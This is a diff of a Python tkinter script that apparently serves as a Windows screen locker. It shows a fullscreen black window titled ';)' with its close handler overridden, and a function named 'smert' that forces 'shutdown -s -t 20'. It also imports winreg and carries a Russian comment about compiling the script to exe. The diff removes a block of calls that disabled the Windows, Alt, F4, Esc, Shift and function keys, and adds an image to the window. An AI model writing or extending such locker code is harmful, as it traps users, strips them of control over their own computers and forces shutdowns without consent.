@@ -4,23 +4,6 @@ from tkinter import messagebox
 from winreg import *
 from os import path
 import time
-import keyboard as k
-k.block_key('win')
-k.block_key('alt')
-k.block_key('f4')
-k.block_key('esc')
-k.block_key('shift')
-k.block_key('f1')
-k.block_key('f2')
-k.block_key('f3')
-k.block_key('f5')
-k.block_key('f6')
-k.block_key('f7')
-k.block_key('f8')
-k.block_key('f9')
-k.block_key('f10')
-k.block_key('f11')
-k.block_key('f12')
 PathFile = path.abspath(__file__)
 # (Если будете компилировать файл в ехе тогда PathFile = path.abspath(__file__)[:-2]+'exe')
 
@@ -43,6 +26,10 @@ def smert():
     os.system('shutdown -s -t 20')
 tk = Tk()
 tk.title(';)')
+canvas = Canvas(tk, width=125, height=100)
+canvas.pack(anchor=NW)
+dv = PhotoImage(file='dv.png')
+canvas.create_image(1, 1, anchor=NW, image=dv)
 tk.config(bg = 'black')
 tk.geometry("1500x1500")
 tk.protocol('WM_DELETE_WINDOW', close)
